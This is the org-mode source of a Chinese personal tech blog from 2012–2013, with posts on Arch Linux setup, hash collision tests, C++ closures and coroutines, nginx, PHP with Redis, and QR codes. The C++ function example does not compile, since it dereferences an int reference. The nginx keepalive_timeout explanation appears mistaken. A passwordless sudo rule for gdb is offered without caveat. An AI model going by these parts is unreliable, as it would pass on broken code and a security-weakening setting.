* DONE 使用o-blog搭建个人博客                                        :o@blog:
  CLOSED: [2013-04-09 二 12:30]

  新的博客使用[[http://renard.github.com/o-blog][o-blog]]搭建，使用的是自已的分枝[[https://github.com/tangxinfa/o-blog][tangxinfa-o-blog]]，我的分枝主要是对原系统做了一定的简化以便适用于创建个人博客，另修复了一些bug（主要是中文相关），可使用以下配置安装我的分枝：
  #+begin_src lisp
    (setq el-get-sources '((:name tangxinfa-o-blog
                                      :type git 
                                      :url "https://github.com/tangxinfa/o-blog.git"
                                      :load "o-blog.el"
                                      :features o-blog)))
  #+end_src
  #+begin_src sh
    M-x el-get-install tangxinfa-o-blog
  #+end_src

  具体使用可参考本博客的原始org文件：

  #+begin_src sh
    git clone https://github.com/tangxinfa/tangxinfa.github.com.git
  #+end_src

* DONE Archlinux下安装fcitx输入法                           :archlinux:fcitx:
  CLOSED: [2012-12-15 六 21:56]

** 安装
   
   #+BEGIN_SRC sh
     sudo yaourt -S fcitx-im
     ln -s /etc/xdg/autostart/fcitx-autostart.desktop  ~/.config/autostart/
   #+END_SRC  

** 配置

   在配置文件~/.xprofile中添加以下内容：
   #+BEGIN_SRC sh
     export GTK_IM_MODULE=fcitx
     export QT_IM_MODULE=fcitx
     export XMODIFIERS="@im=fcitx"
     export LC_CTYPE="zh_CN.UTF-8"
   #+END_SRC

   因为用的是gnome3桌面，需要禁用ibus：
   #+BEGIN_SRC
     gsettings set org.gnome.settings-daemon.plugins.keyboard active false
   #+END_SRC
   还需要在键盘快捷键设置界面中将输入源切换的快捷键清除。

   打开 fcitx-configtool 在 Input Method 中添加 Keyboard - English(US) 和 WubiPinyin，
   现在可以 Ctrl + Space 切换输入法，进行中英文输入了。

   可以取消 fcitx 绑定的全局快捷键，如 emacs 要用 Ctrl+Alt+P，
   fcitx-configtool GUI 工具不能将全局快捷键置空，
   可以直接修改配置文件 ~/.config/fcitx/config 删除快捷键。
   #+begin_src sh
     # Switch Embeded Preedit
     #SwitchPreedit=CTRL_ALT_P
   #+end_src
   改成
   #+begin_src sh
     # Switch Embeded Preedit
     SwitchPreedit=
   #+end_src
   这是因为 fcitx 的配置如果为默认值，则直接注释掉，重启 fcitx 生效配置。
  
* DONE Archlinux下安装cups打印系统                                :archlinux:
   CLOSED: <2013-03-27 三 21:56>

  - 安装 ::
#+BEGIN_SRC sh
yaourt -S cups-pdf
#+END_SRC
  
  - 启动 ::
#+BEGIN_SRC sh
sudo systemctl start cups
#+END_SRC

  - 配置 ::
    参考：https://wiki.archlinux.org/index.php/Cups#PDF_virtual_printer

    登录的用户名要为root，否则后面还是无法添加打印机，web界面没有退出登录的选项，可以试试重启cups服务浏览器清除缓存的数据。

* DONE 网页中的自动完成的下拉列表框                       :web:jquery:chosen:
  CLOSED: <2013-03-10 日 21:23>

** jqueryui的[[http://jqueryui.com/autocomplete/#combobox][组件]]
   示例效果看起来挻好，不过发现几个问题：

   - 和[[http://twitter.github.com/bootstrap/][bootstrap]]有冲突，导致右边的下拉箭头部分都看不见。
   - 操作过程中有时候显示的值和实际的值不一致，应该是中文输入法按键事件在firefox下未触发引起的显示的界面部分和隐藏的select输入框值不同步。
   - 没有提供设置当前选中项、禁用的功能，要自行对生成的界面元素进行处理。
 
   这个只是jqueryui自动完成输入框的一个定制示例，不是很完善，而jqueryui自带的正式版看起来只是一个输入框。

** [[https://github.com/harvesthq/chosen][chosen]]
   非常完美，配置很简单，而且界面很漂亮，在github上评分很高。

* DONE CityHash算法冲突率测试                                          :hash:
  CLOSED: <2012-11-24 六 18:21>

** [[http://code.google.com/p/cityhash/][CityHash]]介绍
   [[http://www.google.com][Google]] 2010年开始开发并开源的字符串哈希算法，主要包含CityHash32()、CityHash64()和CityHash128()，分别对应32位、64位、128位哈希算法。

** 测试样本数据
   16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。

** cityhash64测试结果
   没有冲突

** cityhash32测试结果
   共32246次冲突，冲突率约为千分之二。
   同一哈希值上55次冲突二次，32136次冲突一次。

* DONE C++的函数、闭包与协程                                            :cpp:
   CLOSED: <2013-03-15 五 10:04>
   
** 实现序号生成器
*** 函数（Function）
    #+begin_src c++
    #include <cassert>
    
    int id_generator(int& base, int step)
    {
        int result = *base;
        *base += step;
        return result;
    }
    
    int main(int argc, char *argv[])
    {
        int odd_base = 1;
        int even_base = 0;    
        assert(id_generator(odd_base, 2) == 1);
        assert(id_generator(odd_base, 2) == 3);
        assert(id_generator(odd_base, 2) == 5);
        assert(id_generator(even_base, 2) == 0);
        assert(id_generator(even_base, 2) == 2);
        assert(id_generator(even_base, 2) == 4);        
        return 0;
    }
    #+end_src

    - 编译 ::
      #+begin_example
      g++ -g add.cpp -o add
      #+end_example

*** 闭包（Closure）
    #+begin_src c++
    #include <cassert>
      
    int main(int argc, char *argv[])
    {
        int base = 1;
        auto id_generator_odd = [=]() mutable { int result = base; base += 2; return result; };
        base = 0;
        auto id_generator_even = [=]() mutable { int result = base; base += 2; return result; };
        assert(id_generator_odd() == 1);
        assert(id_generator_odd() == 3);
        assert(id_generator_odd() == 5);
        assert(id_generator_even() == 0);
        assert(id_generator_even() == 2);
        assert(id_generator_even() == 4);
        assert(base == 0);
        return 0;
    }
    #+end_src

    - 编译 ::
      #+begin_example
      g++ -g closure.cpp -o closure -std=c++0x
      #+end_example

*** 协程（Coroutine）
    #+begin_src c++
    #include <boost/bind.hpp>
    #include <boost/coroutine/all.hpp>
      
    typedef boost::coroutines::coroutine< int(void) > IDGenerator;
      
    void idGenerator(IDGenerator::caller_type& ca, int base, int step)
    {
        do{
            ca(base);
            base += step;
        }while(true);
    }
      
    int main(int argc, char *argv[])
    {
        IDGenerator id_generator_odd(boost::bind(idGenerator, _1, 1, 2));
        IDGenerator id_generator_even(boost::bind(idGenerator, _1, 0, 2));
        assert(id_generator_odd.get() == 1);
        assert(id_generator_odd().get() == 3);
        assert(id_generator_odd().get() == 5);
        assert(id_generator_even.get() == 0);
        assert(id_generator_even().get() == 2);
        assert(id_generator_even().get() == 4);
        return 0;
    }
    #+end_src

    - 编译 ::
      #+begin_example
      g++ -g coroutine.cpp -lboost_context -o coroutine -std=c++0x
      #+end_example

** 特性比较
*** 函数（Function）
    - 无状态
    - 需要独立定义执行体
    - 调用过程中从头到尾执行体内所有代码
    - 在输入相同的情况下，能够保证输出也相同
    - 没有副作用，多线程安全
    - 要借助外部变量保存状态
    - 调用比较麻烦，需要传入保存状态的参数

*** 闭包（Closure）
    - 有状态，内部直接保存
    - 直接内联定义执行体
    - 调用过程中从头到尾执行体内所有代码
    - 输入相同的情况下，输出可能不同
    - 有副作用，非多线程安全
    - 定义时可以多种方式安全地引用外部变量
    - 调用简单，不需要传入保存状态的参数
      
*** 协程（Coroutine）
    - 有状态，内部直接保存
    - 需要独立定义执行体
    - 调用过程中直接从上次的运行状态继续运行
    - 输入相同的情况下，输出可能不同
    - 严禁多线程访问
    - 调用简单，不需要传入保存状态的参数    

* DONE 在emacs模式行上显示图片的尺寸                                  :emacs:
  CLOSED: <2012-08-03 五 08:55>

  下面的lisp代码用于在emacs模式行上显示图片的尺寸：
  #+BEGIN_SRC lisp
  (add-hook 'image-mode-hook (lambda ()
                            "display image size on mode line."
                            (setq mode-name (format "Image[%s](%s*%s)" 
                                                    image-type 
                                                    (car (image-size (image-get-display-property) t)) 
                                                    (cdr (image-size (image-get-display-property) t))))))
  #+END_SRC

  - 效果如下 ::
  #+begin_example
  [(Image[png](181*415))]
  #+end_example
  
* DONE 在emacs中如何以root权限使用gdb调试程序                         :emacs:
  CLOSED: <2013-03-30 六 14:21>

 - 由于M-x命令中使用sudo输入密码无效，需要配置为允许用户sudo gdb免密码
 #+begin_example
 visudo
 # Allow user to sudo gdb without password
 用户 ALL=NOPASSWD: /usr/bin/gdb
 #+end_example

 - 使用root权限启动gdb
 #+begin_example
 M-x gdb
 sudo gdb <program> <pid> --annotate=3
 #+end_example

* DONE 解决360杀毒报网页HTML.Rce.Gen3恶意程序的问题                     :web:
  CLOSED: <2012-08-01 三 08:55>

** 问题描述
   测试发现在某些机器上会弹出360杀毒危险警告对话框，导致网页无法打开。

** 解决方法
   将嵌入的统计js脚本从</html>标签后移到里面去。
   - 修改前
   #+BEGIN_SRC html
   ...
   </body>
   </html>
   <script type="text/javascript">document.write(unescape("%3Cscript%20...%3C/script%3E"));</script>
   #+END_SRC
   - 修改后
   #+BEGIN_SRC html
   ...
   <script type="text/javascript">document.write(unescape("%3Cscript%20...%3C/script%3E"));</script>
   </body>
   </html>
   #+END_SRC

** 心得
   以后再遇到这种情况，可以采取排除法，将网页另存为本地文件，一点点的删除内容直到360杀毒不再报警为止。

* DONE 解决Archlinux下ati显卡3D硬件加速失效的问题                 :archlinux:
  CLOSED: <2012-09-05 三 23:52>

** 问题描述
   - 症状

     进入gnome3桌面环境后很卡，不动还好，一动gnome-shell进程cpu占用就直奔100%。

   - dmesg异常日志
     #+BEGIN_EXAMPLE
     radeon_cp: Failed to load firmware "radeon/R520_cp.bin"
     radeon 0000:01:00.0: failed initializing CP (-2).
     radeon 0000:01:00.0: Disabling GPU acceleration
     #+END_EXAMPLE
** 解决办法
#+BEGIN_SRC sh
  sudo ln -s /usr/lib/firmware /lib/
  sudo reboot
#+END_SRC
** 经验总结
   出现问题时网上不一定能找到你要的答案，像这个问题，网上的论坛里有无数个建议，一个一个试下去其实很浪费时间，
   试几次之后还没能解决就应该尝试主动分析解决，像这里稍微留意到括号里的-2，就能发现其实它是个错误码，
   perror一下就知道意思是“找不到文件或目录”，联想到最近几次升级archlinux在把/lib里的东西往/usr/lib下移，
   其中就包括firemware，这样手工在旧的firmware位置建一个软链接就解决了这个问题。

** 备注
   这个问题应该是由于之前glibc升级时未全部完成引起的，archlinux现在把/lib改为/usr/lib的软链接了，可以手工进行设置为软链接这一步骤来修复。

* DONE Fnv算法冲突率测试                                               :hash:
  CLOSED: <2012-11-24 六 18:31>

** [[http://www.isthe.com/chongo/tech/comp/fnv/][Fnv]]介绍
   Fnv是和 [[http://code.google.com/p/cityhash/][CityHash]] 类似的哈希算法。这里重复《[[http://blog.kankanan.com/posts/2012/11/24_cityhash7b976cd551b27a8173876d4b8bd5.html][CityHash算法冲突率测试]]》，做为一个对比。

** 测试样本数据
   16630591行不重复字符串，每一行内容为以制表符分隔的下载地址和引用页。

** fnv64测试结果
   没有冲突

** fnv32测试结果
   共31948次冲突，冲突率约为千分之二。
   同一哈希值上33次冲突二次，31879次冲突一次。
   冲突率比CityHash略低，少了298次。

* DONE 如何做面试
  CLOSED: <2012-10-24 三 14:23>

** 语言基础
** 相关技术
** 性能优化
** 架构
** 管理
** 诉求
* DONE 理解nginx的keepalive_timeout配置项                        :nginx:http:
  CLOSED: [2012-11-12 二 17:05]
  
  不要误以为它是指tcp连接空闲多少秒后关闭，它仅表示连接建立多少秒后关闭，不会在一次请求后重新计时。

* DONE 在python中安装mysqldb模块                                     :python:
  CLOSED: <2012-08-01 三 08:55>

** 正常的安装过程
#+begin_src sh
  wget "http://downloads.sourceforge.net/project/mysql-python/mysql-python\
/1.2.3/MySQL-python-1.2.3.tar.gz?r=http%3A%2F%2Fsourceforge.net%2Fprojects\
%2Fmysql-python%2Ffiles%2F&ts=1304062611&use_mirror=nchc"
  tar xzvf MySQL-python-1.2.3.tar.gz
  cd MySQL-python-1.2.3
  python setup.py build
  python setup.py install
#+end_src

** 常见错误及其修复
   - ImportError: No module named setuptools
     #+name: install-setuptools
     #+begin_src sh
     wget http://pypi.python.org/packages/2.4/s/setuptools/setuptools-0.6c11-py2.4.egg\
     #md5=bd639f9b0eac4c42497034dec2ec0c2b
     sh setuptools-0.6c11-py2.4.egg
     #+end_src

   - mysql_config: command not found
     #+name: edit-site.cfg 
     #+begin_src sh
     sed --in-place -e "s/#mysql_config = \/usr\/local\/bin\/mysql_config/\
     mysql_config = \/usr\/local\/mysql\/bin\/mysql_config/g" site.cfg
     #+end_src

   - ImportError: \dots{} _mysql.so: undefined symbol: compress
     #+name: edit-setup_posix.py
     #+begin_src sh
     sed --in-place -e "s/libs = mysql_config(\"libs_r\")/libs = mysql_config(\"libs_r\")\n\
     libs.append('-lz')\n        print libs/g" setup_posix.py
     #+end_src

* DONE 如何学习英语                                                 :english:
  CLOSED: <2013-04-07 日 09:49>

  经过一天的英孚及韦博试听，总结出以下几点：
  - 语法 ::
    熟读常用句型，扩展至类似语句，从中提炼语法，另一方面也可以练就一口流利的日用口语。
  - 听力 ::
    不会说就不会听，多说才能够快速识别听到的东西。
  - 阅读 ::
    多记单词，不断的重复重复再重复，直到看到单词脱口而出。
  
* DONE MongoDB基础                                                  :mongodb:
  CLOSED: <2012-10-21 日 17:06>
  
** MongoDB与Mysql的基本结构对应关系
*** 一台机器
    computer

**** 多个MongoDB实例                                          <--对应-->                    mysql服务器进程
     MongoDB Instance                                        <--对应-->                    Mysqld Instance

     运行着的MongoDB后台服务进程：/etc/rc.d/mongodb start      <--对应-->                     /etc/rc.d/mysqld start

***** 多个数据库                                              <--对应-->                    mysql中的数据库
      MongoDB Database                                       <--对应-->                     Database

****** 多个集合                                               <--对应-->                    mysql中的表
       MongoDB Collection                                    <--对应-->                     Table

******* 多个文档                                             <--对应-->                     mysql中的记录行
        MongoDB Document                                     <--对应-->                    Row

** CentOS上搭建环境
   - 添加源/etc/yum.repos.d/10gen.repo ::
     #+BEGIN_EXAMPLE
     [10gen]
     name=10gen Repository
     baseurl=http://downloads-distro.mongodb.org/repo/redhat/os/x86_64
     gpgcheck=0
     #+END_EXAMPLE
   - 安装服务器客户端程序 ::
     #+BEGIN_SRC sh
     yum install mongo-10gen mongo-10gen-server
     #+END_SRC
   - 安装php扩展 ::
     #+BEGIN_SRC sh
     yum -y install make gcc php-devel
     yum install php-pear
     PATH=$PATH:/usr/local/php/bin/ pecl install mongo
     #+END_SRC
     php.ini中添加：extension=mongo.so
   - 启动服务 ::
     /etc/rc.d/init.d/mongodb start
    
* DONE 解决mysql_connect慢的问题                                      :mysql:
  CLOSED: <2012-12-06 四 10:25>

 压测时发现mysql_connect耗时超过30秒，登录mysql后执行show processlist，显示超过800个连接状态如下：

 #+BEGIN_EXAMPLE
  unauthenticated user | XXXX.XXX.XXX.XXX:XXXX  | NULL | Connect     |  NULL | login    
 #+END_EXAMPLE

 经求教运维，在my.cnf中的“[mysqld]”下添加以下配置行即可：

 #+BEGIN_EXAMPLE
   skip-name-resolve
 #+END_EXAMPLE

* DONE Nginx Comet: 基于 HTTP 长连接的“服务器推”技术          :nginx:comet:
  CLOSED: <2012-12-14 五 21:09>

** 简介
   可参考这篇文章：[[http://www.ibm.com/developerworks/cn/web/wa-lo-comet/][Comet：基于 HTTP 长连接的“服务器推”技术]]

** [[https://github.com/slact/nginx_http_push_module][nginx_http_push_module]] （不建议使用）
  这个模块功能上没有问题，网上介绍的文章相对比较多，但是存在严重的内存泄露问题，而且发现使用kill -HUP的方式优雅重启nginx虽会释放一部分内存，但nginx错误日志显示有共享内存锁相关的冲突，我们不得不每小时彻底重启一次nginx。简单说一下就是它使用一个全局的内存池来分配订阅者及响应需要的内存空间，但是从nginx内存池分配的小内存块（< pagesize，4096）是不会释放的也不会归还到池中进行重用，具体可查看nginx源码的ngx_palloc和ngx_pfree函数进行验证。

  可google "nginx中mod_push模块内存分配改造"，在作者的[[http://http://blog.lifeibo.com/][网站]]正在改版暂时找不到该文章。
  
  [[http://bsd.ee/~hadara/blog/?p=215=1][这里]]也有人[[https://github.com/slact/nginx_http_push_module/pull/60][指出]]该问题，同时该文作者也fork了一个分枝，但是我试了一下，除了不支持push_channel_timeout特性外，还是一样有内存泄露。

  - 参考配置 ::
#+BEGIN_EXAMPLE
    location ~ ^/publish$ {
        allow 127.0.0.1;
        deny all;
        set $push_channel_id $arg_id;
        push_publisher;
        push_delete_oldest_received_message on;
        push_message_timeout 5s;
        #push_channel_timeout 60s;
        push_store_messages off;
    }

    location ~ ^/activity$ {
        if ($args ~ "callback=(.+)" ) {
            rewrite ^/activity "/activity_jsonp" last;
        }
        push_subscriber;
        push_subscriber_timeout 60s;
        push_subscriber_concurrency first;
        push_max_channel_subscribers 1;
        set $push_channel_id $arg_id;
        default_type application/json;
    }

    location ~ ^/activity_jsonp$ {
        push_subscriber;
        push_subscriber_timeout 60s;
        push_subscriber_concurrency first;
        push_max_channel_subscribers 1;
        set $push_channel_id $arg_id;
        default_type application/json;
        echo_before_body $arg_callback "(";
        echo_after_body ")";
    }
#+END_EXAMPLE

** [[https://github.com/wandenberg/nginx-push-stream-module][nginx-push-stream-module]] （建议使用）
  由于 [[https://github.com/slact/nginx_http_push_module][nginx_http_push_module]] 存在内存泄露问题，同时没有人进行正式的修复，我们决定尝试一下[[https://github.com/wandenberg/nginx-push-stream-module][nginx-push-stream-module]]，这个模块功能更强大同时文档更完整，看起来也更活跃。

  - 优点 ::
    + 更成熟
      有内存消耗说明文档，便于决定共享内存容量配置。
      有统计功能。
      可对响应内容进行再处理。
    + 测试中未发现明显的内存泄露
    + 内置支持jsonp
      返回的jsonp是这样的格式callback([text])，可以通过修改ngx_http_push_stream_module_utils.h中定义的NGX_HTTP_PUSH_STREAM_CALLBACK_INIT_CHUNK和NGX_HTTP_PUSH_STREAM_CALLBACK_END_CHUNK去除多余的中括号。
  
- 参考配置 ::
#+BEGIN_EXAMPLE
push_stream_store_messages off;
push_stream_max_subscribers_per_channel 1;
push_stream_subscriber_connection_ttl 60s;
push_stream_longpolling_connection_ttl 60s;

server {
    listen 80;
    server_name localhost 127.0.0.1;
    
    ...

    location ~ ^/publish$ {
        allow 127.0.0.1;
        deny all;
        push_stream_publisher admin;
        set $push_stream_channel_id $arg_id;
    }
    
    location ~ ^/activity$ {
        push_stream_subscriber long-polling;
        set $push_stream_channels_path $arg_id;
        push_stream_content_type "application/json";
        push_stream_message_template "~text~";
    }

    ...
}

#+END_EXAMPLE  

* DONE nginx下快速搭建php运行环境                                 :nginx:php:
  CLOSED: <2012-08-11 六 21:09>

** 安装
*** 安装nginx
    yaourt -S nginx
*** 安装php
     yaourt -S php
*** 安装php-fpm
     yaourt -S php-fpm

** 配置
*** 配置nginx
    - 将nginx.conf中的以下部分：
      #+BEGIN_EXAMPLE
        #location ~ \.php$ {
        ...
        #}
      #+END_EXAMPLE
    - 修改为
      #+BEGIN_EXAMPLE
         location ~ \.php$ {
            root           /usr/share/nginx/html;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            fastcgi_param  SCRIPT_FILENAME  /usr/share/nginx/html$fastcgi_script_name;
            include        fastcgi_params;
         }
      #+END_EXAMPLE
*** 配置php
    在open_basedir中添加：/usr/share/nginx/html
*** 配置php-fpm.conf
    启用以下listen配置：
    listen = 127.0.0.1:9000

** 运行
   - 重启nginx
     #+BEGIN_SRC sh
     sudo /etc/rc.d/nginx restart
     #+END_SRC
   - 启动php-fpm
     #+BEGIN_SRC sh
     sudo php-fpm
     #+END_SRC
   - 然后在/usr/share/nginx/html目录中写php脚本即可。

* DONE php中DOMDocument类createElement和createTextNode的区别            :php:
  CLOSED: <2012-09-27 四 19:05>

** DOMDocument::createElement
   - 原型：DOMElement DOMDocument::createElement ( string $name [, string $value ] )

     创建一个元素，其中第二个参数是可选的，不会对它进行转义。当value中包含特殊字符（如：&）会出错。
  
** Domdocument::createTextNode
   - 原型：DOMText DOMDocument::createTextNode ( string $content )

     创建一个文本结点，会对其内容进行转义。

** 典型示例：创建一个文本元素
   #+begin_src php
   $element = $doc->createElement("city");
   $node = $doc->createTextNode("shenzhen");
   $element->appendChild($node);
   $doc->appendChild($element);
   #+end_src
   - 对应的xml文档：
   #+begin_src xml
   <city>shenzhen</city>
   #+end_src
    
* DONE 当php遇上redis                                             :php:redis:
  CLOSED: <2012-12-08 六 13:41>

  在最近的项目中，我们需要在php中访问redis，我们选择了使用[[https://github.com/nicolasff/phpredis][phpredis]]库，下面是遇到的一些问题。

** redis持久连接不靠谱。

   可以说这是php的通病了，不管是mysql、memcache还是redis，指望由php本身（包含php扩展）来实现持久连接都是行不通的。

   - 为什么这么说呢？ ::
     首先，所谓的持久连接的实现不外乎在进程（php-fpm）内建一个连接池，当php需要连接时，先以ip+port等信息为key在池中查找，找到则直接返回已有连接没有则新建连接。而当一个请求执行结束时，不关闭连接，而是把连接归还到池中。
     
     这样当php需要用到多个redis实例时（分库），因为一个php-fpm进程会持有每个redis实例的一个连接，所以需要“php-fpm进程数“*“redis实例数"个redis连接，而对于每个redis服务器则有“php-fpm进程数“个客户端连接。

     举个例子：一个web应用开了1000个php-fpm进程，有10个redis实例，那么保持的redis连接数就为1000*10也就是10000，每个redis实例有1000个客户端连接。如果前端或redis再扩容所需要的连接就会以乘积方式增加。一个redis实例有php-fpm进程数个连接的情况下表现如何呢，这就要好好测一测了，反正是每连接一线程的mysql是直接堵死了。

** RedisArray不靠谱。
   RedisArray实现了一致性hash分布式，但是它在初始化的时候就会连接上每个实例，这在web应用中简直是胡闹，它对一致性hash实现得比较完善，结点失效、动态添加结点时重新hash都有处理，在万不得已进行水平扩容时，可能会用得上。

** 需要自已关闭redis连接。
  Redis的析构函数没有关闭redis连接，这会导致redis网络负载过高，要确保脚本结束时关闭连接，最好是能够封装一下Redis类再使用。

  - 示例封装 ::
#+BEGIN_SRC php
/// 分布式Redis.
class RedisShard {
    /// 构造函数.
    public function __construct($shards) {
        $this->reinit($shards);
    }

    /// 析构函数.
    /// 脚本结束时，phpredis不会自动关闭redis连接，这里添加自动关闭连接支持.
    /// 可以通过手动unset本类对象快速释放资源.
    public function __destruct() {
        if(isset($this->shard)){
            $this->shard['redis']->close();
        }
    }

    /// 重新初始化.
    public function reinit($shards){
        $index = 0;
        $this->shards = array();
        foreach($shards as $shard){
            $this->shards[$index] = explode(':', $shard); //格式：host:port:db
            $this->shards[$index]['index'] = $index;
            ++$index;
        }        
    }
    
    /// 转发方法调用到真正的redis对象.
    public function __call($name, $arguments) {
        $result = call_user_func_array(array($this->redis($arguments[0]), $name), $arguments);
        if($result === false and in_array($name, array('set', 'setex', 'incr'))) {
            trigger_error("redis error: " . $this->shard[0] . ':' . $this->shard[1] . ':' .$this->shard[2] . " $name " . implode(' ', $arguments), E_USER_NOTICE);
        }
        return $result;
    }

    /// 获取1至max间的唯一序号name，达到max后会从1开始.
    /// redis的递增到最大值后会返回错误，本方法实现安全的递增。
    /// 失败返回false，最要确保已用redis()方法连到生成序号的某个redis对象.
    public function id($name, $max) {
        if(isset($this->shard)){
            $id = $this->shard['redis']->incr('_id_' . $name);
            if($id){
                $max = intval($max/count($this->shards));
                if($id % $max == 0){
                    while($this->shard['redis']->decrBy('_id_' . $name, $max) >= $max){
                    }
                    $id = $max;
                }
                else if($id > $max){
                    $id %= $max;
                }
                return ($id - 1)*count($this->shards) + ($this->shard['index'] + 1);
            }
        }
        return false;
    }

    /// 连接并返回key对应的redis对象.
    public function redis($key){
        //TODO: crc32在32位系统下会返回负数，因我们是部署在64位系统上，暂时忽略.
        assert(PHP_INT_SIZE === 8);
        $index = crc32($key) % count($this->shards);
        $shard = $this->shards[$index];
        if(isset($this->shard)){
            //尝试重用已有连接.
            if($this->shard[0] == $shard[0] and $this->shard[1] == $shard[1]){
                if($this->shard[2] != $shard[2]){
                    if(! $this->shard['redis']->select($shard[2])){
                        trigger_error('redis error: select ' . $shard[0] . ':' . $shard[1] . ':' .$shard[2], E_USER_ERROR);
                        return false;
                    }
                    $this->shard[2] = $shard[2];
                }
                return $this->shard['redis'];
            }
            $this->shard['redis']->close();
            unset($this->shard);
        }
        //新建连接.
        $shard['redis'] = new Redis();
        if(! $shard['redis']->connect($shard[0], $shard[1])){
            trigger_error('redis error: connect ' . $shard[0] . ':' . $shard[1], E_USER_ERROR);
            return false;
        }
        $db = intval($shard[2]);
        if($db != 0 and !$shard['redis']->select($db)){
            trigger_error('redis error: select ' . $shard[0] . ':' . $shard[1] . ':' .$shard[2], E_USER_ERROR);
            $shard['redis']->close();
            return false;
        }
        if(ENABLE_DEVELOP){
            trigger_error('redis connect success. ' . $shard[0] . ':' . $shard[1] . ':' . $shard[2], E_USER_NOTICE);
        }        
        $this->shard = $shard;
        return $this->shard['redis'];
    }
}
#+END_SRC

* DONE python中的UTC与本地时区处理                                   :python:
  CLOSED: <2013-03-20 三 17:29>

  在通过sqlalchemy使用sqlite3数据库的过程中，发现日期时间字段默认值为CURRENT_TIMESTAMP，但是查出的值少了8个小时。很明显是遇到时区问题了。

  mysql的TIMESTAMP字段类型和sqlite3一样使用UTC时间保存，因为在存取时自动进行了本地时间与UTC时间互转，所以不会遇到时区问题。但是sqlite3没有自动进行这一转换，需要在sql中自行转换:
  #+begin_src sql
   select datetime(CURRENT_TIMESTAMP, 'localtime')
  #+end_src

  进一步google后，找到了这篇文章：《[[http://lucumr.pocoo.org/2011/7/15/eppur-si-muove/][Dealing with Timezones in Python]]》，文章大意是python中的datetime库默认不携带时区信息，而加上时区后又与不带时区的datetime对象无法一起工作（如：比较），另外像datetime.datetime.utcnow()返回的utc时间和datetime.datetime.now()返回的本地时间也是不携带时区信息的（tzinfo属性为None），容易引起混淆，因此处理的简单性，内部最好统一使用UTC标准时间，和用户交互时再转换为本地时间。

  下面是互转的算法：
  #+begin_src python
     #/usr/bin/env python
     
     import datetime
     import time
     import sys
     
     if sys.version >= '3.2.':
         localtimezone = datetime.timezone(datetime.timedelta(seconds=-time.timezone), time.tzname[0])
         utctimezone = datetime.timezone.utc
     else:
         from dateutil import tz
         localtimezone = tz.tzlocal()
         utctimezone = tz.gettz('UTC')
     
     def parsedatetime(dt, fmt="%Y-%m-%d %H:%M:%S"):
         """parse local datetime string as utc datetime object"""
         return datetime.datetime.strptime(dt, fmt).replace(tzinfo=localtimezone).astimezone(utctimezone)
     
     def formatdatetime(dt, fmt="%Y-%m-%d %H:%M:%S"):
         """format utc datetime object as local datetime string"""
         return dt.replace(tzinfo=utctimezone).astimezone(localtimezone).strftime(fmt)
     
     if __name__ == '__main__':
         input_local_datetime = '2012-01-02 03:04:05'
         parsed_utc_datetime = parsedatetime(input_local_datetime)
         assert(formatdatetime(parsed_utc_datetime) == input_local_datetime)
  #+end_src

* DONE 二维码研究                                                    :qrcode:
  CLOSED: <2013-03-30 六 11:21>

** 介绍
   - [[http://www.itsc.org.sg/pdf/synthesis08/Three_QR_Code.pdf][Three_QR_Code.pdf]] ::
     RFC式的文档

   - [[http://suflow.iteye.com/blog/1100678][二维码 编码原理简介]] ::
     通俗易懂的编码细节介绍

   - [[http://zh.wikipedia.org/wiki/QR%E7%A2%BC][QR碼 - 维基百科，自由的百科全书]] ::

   - [[http://www.qrstuff.com/blog/2011/11/23/qr-code-minimum-size][QR Code Minimum Size]] 与 [[http://www.qrstuff.com/blog/2011/01/18/what-size-should-a-qr-code-be][What Size Should A Printed QR Code Be?]] ::
     关于可识别性的一些结论，该网站上有大量二维码研究相关的文章
   
** 二维码开发库
   - [[https://github.com/fukuchi/libqrencode][libqrencode]] ::
     基础的c语言二维码编码库，很多语言基于它开发扩展，不包含生成png图的功能，如需生成png可参考[[https://github.com/bitly/simplehttp/blob/master/qrencode/qrencode.c][这里]]
   - [[https://github.com/jeromeetienne/jquery-qrcode][jquery-qrcode]] ::
     使用javascript直接在客户端生成二维码，中文支持参见[[http://suflow.iteye.com/blog/1687396][JS生成二维码，支持中文字符]]
   - [[http://people.freebsd.org/~vanilla/qrencode-0.3.tar.bz2][php's qrencode extension]] ::
     使用nginx的扩展性能会更好一点，参考后面[[nginx的相关扩展]].
   - [[http://trac.koka-in.org/libdecodeqr][libdecodeqr]] ::
     二维码解码库

** 二维码生成工具

   - [[https://launchpad.net/qr-code-creator/][qr-code-creator]] ::
     linux下的GUI程序。

   - [[https://npmjs.org/package/qrcode-terminal][qrcode-terminal]] ::
     linux终端下生成并展示二维码，是一个node.js模块，带命令行工具程序，方便使用，介绍文章：[[http://blog.michaelbrooks.ca/qrcode-terminal/][QR Code Terminal]]
     
   - [[https://github.com/lincolnloop/python-qrcode][python-qrcode]] ::
     linux终端下生成并展示二维码，是一个python包，带命令行工具程序，方便使用。

** nginx的相关扩展
*** 基本的二维码
    [[https://github.com/dcshi/ngx_http_qrcode_module][ngx_http_qrcode_module]]
   
*** 二维码个性化水印
   nginx_http_image_filter加上 [[http://forum.nginx.org/read.php?21,235958][水印补丁]] 即可。

   下面的是经过修改后的 =nginx image filter= 模块代码，加入居中的水印效果:

   [[file:../static/ngx_http_image_filter_module.c][ngx_http_image_filter_module.c]]

*** 编译
    #+begin_src sh
    --with-debug --with-http_image_filter_module --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../ngx_http_qrcode_module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../ngx_devel_kit/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../set-misc-nginx-module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../echo-nginx-module/
    #+end_src

*** 配置
    #+begin_example
         location ~ /qr {
             qrcode_fg_color FF0000;
             qrcode_bg_color FFFFFF;    
             qrcode_level 2;
             qrcode_hint 2;
             qrcode_size 120;
             qrcode_margin 2;
             qrcode_version 5;
             set_unescape_uri $txt $arg_txt;
             qrcode_txt $txt;
             qrcode_casesensitive 1; 
             qrcode_gen;  

             image_filter_watermark "/usr/share/pixmaps/gnome-word.png";
             image_filter_watermark_transparency 95; #0-100
             image_filter watermark;
         }
    #+end_example

*** 访问
#+begin_example
   http://localhost:8080/qr?txt=hello
#+end_example
     - 显示效果：
     [[file:../static/hello_qr.png]]

** 二维码基础服务的一点思索
   - 必须建立在cdn的基础上
   - 用户只需按照约定将内容以及定制参数按照直观的方式编码成二维码图片链接即可

   参考：https://developers.google.com/chart/infographics/docs/qr_codes

